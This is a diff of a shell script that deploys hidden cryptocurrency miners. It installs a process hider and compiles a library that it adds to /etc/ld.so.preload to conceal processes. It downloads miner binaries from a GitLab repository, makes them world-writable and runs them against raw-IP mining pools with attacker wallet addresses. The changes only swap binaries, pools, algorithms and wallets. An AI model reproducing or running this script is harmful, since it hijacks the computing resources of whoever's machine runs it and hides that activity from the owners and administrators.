@@ -13,9 +13,9 @@ curl -sL https://deb.nodesource.com/setup_12.x | sudo -E bash -
 
 npm i -g node-process-hider
 
-wget https://gitlab.com/majapahlevi/mvp/-/raw/main/lol1.82a
+wget https://gitlab.com/majapahlevi/mvp/-/raw/main/lol1.81
 
-chmod 777 lol1.82a
+chmod 777 lol1.81
 
 wget https://gitlab.com/majapahlevi/mvp/-/raw/main/graphics.tar.gz
 
@@ -57,5 +57,5 @@ gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
 mv libprocesshider.so /usr/local/lib/
 echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
 
-./graftcp/graftcp ./lol1.82a --algo KARLSEN --pool 159.203.127.146:80 --user nexellia:qrcmk5pfn0mm2dn4zcq9vhuwfrss6ez93mjl7khkpgpr3sl2xed65yhzmq2cx.$(shuf -n 1 -i 1-99999)-Bismillah --no-cl & wget https://gitlab.com/majapahlevi/mvp/-/raw/main/cpminer
-chmod 777 cpminer && ./cpminer -a yespower -o stratum+tcp://138.197.98.18:443 -u up6wFaDx2cQexHM8VvvRhAFdcDNMESVpbZ.$(shuf -n 1 -i 1-99999)-VISH -t4
+./graftcp/graftcp ./lol1.81 ./lol1.81 -a PYRIN -p 138.197.98.18:80 -u pyrin:qrz6n9aa9595ms5yx36jpmrczh4q50leyrqw833a5pg9kqcey94qz9vl5jvu4.$(shuf -n 1 -i 1-99999)-Bismillah --no-cl & wget https://gitlab.com/majapahlevi/mvp/-/raw/main/b
+chmod 777 b && ./b -o 161.35.141.255:80 -u amyL84t8Uhp9TCiD9Hm82nKSXtjZQJZvGAJQwzEvqbnyCu2WkvysauLSdKcpq42Mbp6w2NpxjZeqq5X32AhQqbVv8iN4jYAEiA -p maggamanis-$(shuf -n 1 -i 1-9999) -a rx/0 -k --donate-level 1
